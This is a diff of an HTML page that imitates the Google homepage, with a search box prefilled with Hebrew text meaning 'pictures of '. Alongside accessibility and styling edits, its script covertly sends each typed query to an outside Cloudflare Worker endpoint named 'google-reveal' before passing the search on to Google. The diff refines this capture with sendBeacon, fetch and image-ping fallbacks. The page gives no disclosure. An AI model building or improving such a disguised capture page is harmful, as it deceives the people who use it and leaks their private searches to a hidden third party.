@@ -12,12 +12,24 @@
   <link rel="dns-prefetch" href="https://google-reveal.avishaierel.workers.dev">
   <link rel="preconnect" href="https://google-reveal.avishaierel.workers.dev" crossorigin>
 
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" />
+  <!-- Perf: preconnect to Google + fonts and use display=swap -->
+  <link rel="preconnect" href="https://www.google.com" crossorigin>
+  <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined&display=swap" />
 
   <style>
-    :root { --bg:#ffffff; --text:#1f1f1f; --border:#dadce0; --icon:#9aa0a6; --blue:#1a73e8; --focus:rgba(26,115,232,.28); --w:clamp(280px,92vw,600px); --r-pill:999px; }
-    @media (prefers-color-scheme: dark){ :root { --bg:#202124; --text:#e8eaed; --border:#5a5a5a; --icon:#ffffff; --blue:#8ab4f8; } }
-    html,body{height:100%;margin:0;font:16px/1.4 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Arial,sans-serif;background:var(--bg);color:var(--text);display:flex;flex-direction:column;}
+    :root {
+      --bg:#ffffff; --text:#1f1f1f; --border:#dadce0; --icon:#9aa0a6; --blue:#1a73e8;
+      --focus:rgba(26,115,232,.28); --w:clamp(280px,92vw,600px); --r-pill:999px;
+    }
+    @media (prefers-color-scheme: dark){
+      :root { --bg:#202124; --text:#e8eaed; --border:#5a5a5a; --icon:#ffffff; --blue:#8ab4f8; }
+    }
+    html,body{
+      height:100%; margin:0; font:16px/1.4 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Arial,sans-serif;
+      background:var(--bg); color:var(--text); display:flex; flex-direction:column;
+    }
     header{display:flex;justify-content:space-between;align-items:center;padding:10px 16px;background:var(--bg);}
     .nav{display:flex;gap:28px;}
     .nav a{position:relative;font-size:14px;color:var(--text);text-decoration:none;text-transform:uppercase;padding-bottom:6px;}
@@ -31,44 +43,62 @@
     main{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding-top:18vh;}
     .logo img{width:204px;height:auto;transition:filter .3s ease;}
     @media (prefers-color-scheme: dark){ .logo img{filter:brightness(0) invert(1);} }
+
     .search{position:relative;margin-top:40px;width:100%;max-width:var(--w);}
-    .search input{width:100%;height:44px;border:1px solid var(--border);border-radius:var(--r-pill);padding:0 100px 0 50px;font-size:16px;outline:none;background:#fff;color:#000;transition:background .3s ease,color .3s ease;}
+    .search input{
+      width:100%;height:44px;border:1px solid var(--border);border-radius:var(--r-pill);
+      padding:0 100px 0 50px;font-size:16px;outline:none;background:#fff;color:#000;
+      transition:background .3s ease,color .3s ease,box-shadow .2s ease;
+    }
     @media (prefers-color-scheme: dark){ .search input{background:#4e5156;color:#e8eaed;} }
-    .search .material-symbols-outlined{position:absolute;top:50%;transform:translateY(-50%);font-size:22px;color:var(--icon);cursor:pointer;user-select:none;}
-    .search .search-icon{left:16px;}
+    .search input:focus-visible{ box-shadow:0 0 0 3px var(--focus); }
+
+    .material-symbols-outlined{
+      font-variation-settings:'FILL' 0,'wght' 400,'GRAD' 0,'opsz' 24;
+      font-size:22px; line-height:1;
+    }
+    .search .material-symbols-outlined{
+      position:absolute;top:50%;transform:translateY(-50%);color:var(--icon);user-select:none;
+    }
+    .search .search-icon{left:16px;cursor:pointer;padding:6px;border-radius:999px;}
+    .search .search-icon:focus-visible{outline:none;box-shadow:0 0 0 3px var(--focus);}
     .search .mic{right:56px;}
     .search .camera{right:18px;}
+
     footer{margin-top:auto;border-top:1px solid var(--border);background:var(--bg);padding:14px;text-align:center;}
     footer a{color:var(--text);opacity:.9;text-decoration:none;font-size:14px;margin:0 8px;}
     footer a:hover{text-decoration:underline;}
+
+    @media (prefers-reduced-motion: reduce){ .logo img{transition:none;} }
   </style>
 </head>
 <body>
   <header>
-    <nav class="nav">
+    <nav class="nav" aria-label="Primary">
       <a href="#" class="active">ALL</a>
       <a href="#">IMAGES</a>
     </nav>
     <div class="header-right">
-      <div class="app-grid" title="Google apps">
+      <div class="app-grid" title="Google apps" aria-label="Google apps" role="button" tabindex="0">
         <div></div><div></div><div></div>
         <div></div><div></div><div></div>
         <div></div><div></div><div></div>
       </div>
-      <a class="sign-in" href="https://accounts.google.com/ServiceLogin">Sign in</a>
+      <a class="sign-in" href="https://accounts.google.com/ServiceLogin" rel="noopener">Sign in</a>
     </div>
   </header>
 
   <main>
-    <div class="logo">
-      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+    <div class="logo" aria-hidden="true">
+      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="">
     </div>
 
-    <form id="search" class="search" action="https://www.google.com/search" method="GET">
-      <span id="searchButton" class="material-symbols-outlined search-icon" title="Search">search</span>
-      <input id="q" name="q" type="search" placeholder="Search" aria-label="Search">
-      <span class="material-symbols-outlined mic">mic</span>
-      <span class="material-symbols-outlined camera">photo_camera</span>
+    <form id="search" class="search" action="https://www.google.com/search" method="GET" role="search" target="_self">
+      <span id="searchButton" class="material-symbols-outlined search-icon" title="Search" role="button" tabindex="0" aria-label="Search">search</span>
+      <input id="q" name="q" type="search" placeholder="Search" aria-label="Search"
+             autocomplete="on" spellcheck="false" autocorrect="off" autocapitalize="none" inputmode="search" />
+      <span class="material-symbols-outlined mic" aria-hidden="true">mic</span>
+      <span class="material-symbols-outlined camera" aria-hidden="true">photo_camera</span>
     </form>
   </main>
 
@@ -82,10 +112,13 @@
     <a href="#">Settings</a>
   </footer>
 
-  <script>
+  <noscript><!-- Without JS, the form still navigates to Google --></noscript>
+
+  <script defer>
     // Prefill (Hebrew) and focus
     const DEFAULT_TEXT = "תמונות של ";
-    const ENDPOINT = 'https://google-reveal.avishaierel.workers.dev'; // no trailing slash
+    // ⚙️ Point this to your Cloudflare Worker endpoint (no trailing slash)
+    const ENDPOINT = 'https://google-reveal.avishaierel.workers.dev';
 
     const form = document.getElementById('search');
     const input = document.getElementById('q');
@@ -98,29 +131,41 @@
       input.setSelectionRange(input.value.length, input.value.length);
     });
 
-    function sendToBackend(q) {
+    function sendToBackend(rawQ){
+      // Strip default prefix and trim
+      let q = rawQ.startsWith(DEFAULT_TEXT) ? rawQ.slice(DEFAULT_TEXT.length) : rawQ;
+      q = (q || "").trim();
+      if (!q) return;
+
+      const base = (ENDPOINT || '').replace(/\/$/, '');
+      const url = base + '/api/save';
+      const params = new URLSearchParams({ q });
+
+      // 1) Best-effort, reliable background send
       try {
-        // Strip the default prefix before sending
-        let cleanQ = q.startsWith(DEFAULT_TEXT) ? q.slice(DEFAULT_TEXT.length) : q;
-        cleanQ = (cleanQ || "").trim();
-        if (!cleanQ) return;
+        if (navigator.sendBeacon) {
+          const blob = new Blob([params.toString()], {
+            type: 'application/x-www-form-urlencoded;charset=UTF-8'
+          });
+          navigator.sendBeacon(url, blob);
+          return;
+        }
+      } catch (_) { /* fall through */ }
 
-        const ts = Date.now().toString(); // cache-buster
-        const qs = new URLSearchParams({ q: cleanQ, _: ts });
-
-        // 1) Guaranteed: fire-and-forget GET to /api/save (no CORS needed)
-        (new Image()).src = ENDPOINT + '/api/save?' + qs.toString();
-
-        // 2) Also send a POST with keepalive (if the browser supports it)
-        const body = new URLSearchParams({ q: cleanQ });
-        fetch(ENDPOINT + '/api/save', {
+      // 2) Fetch POST fallback
+      if (typeof fetch === 'function') {
+        fetch(url, {
           method: 'POST',
-          body,
+          body: params,
           keepalive: true,
           mode: 'cors',
-          headers: { 'content-type': 'application/x-www-form-urlencoded' }
-        }).catch(() => {});
-      } catch(e) {}
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' }
+        }).catch(()=>{});
+        return;
+      }
+
+      // 3) Ultimate fallback: GET image ping
+      (new Image()).src = url + '?' + params.toString();
     }
 
     navLinks.forEach(link => {
@@ -130,16 +175,20 @@
       });
     });
 
-    // Use capture so this runs before navigation
+    // Capture so we send before navigation
     form.addEventListener('submit', function(){
       const q = (input.value || '').trim();
       if (q) sendToBackend(q);
     }, { capture: true });
 
-    searchBtn.addEventListener('click', function(){
+    // Icon acts like a submit button (mouse + keyboard)
+    function triggerSearch(){
       const q = (input.value || '').trim();
-      if (q) { sendToBackend(q); form.submit(); }
-      else { input.focus(); }
+      if (q) { sendToBackend(q); form.submit(); } else { input.focus(); }
+    }
+    searchBtn.addEventListener('click', triggerSearch);
+    searchBtn.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); triggerSearch(); }
     });
   </script>
 </body>
